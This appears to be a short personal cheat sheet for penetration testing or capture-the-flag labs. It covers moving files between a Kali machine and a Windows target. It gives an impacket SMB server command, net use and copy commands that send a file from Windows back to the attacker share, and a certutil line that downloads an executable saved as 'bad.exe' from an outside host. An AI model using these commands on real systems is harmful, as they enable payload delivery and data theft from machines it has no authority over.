# Windows file transfer  

## smb  

Start a smb server on kali using impacket suite.  

`sudo smbserver.py -username kurdt -password purplerain purple ~/rockstar`  

On windows, password is purplerain.  

`net use \\10.10.14.69\purple /u:\kurdt purplerain`  

To transfer files from kali to windows current directory.  

`cp \\10.10.14.69\purple\test.txt .`  

To transfer files from windows to kali.  

`cp groups-result.txt \\10.10.14.69\purple`  

## certutil  

`certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe`
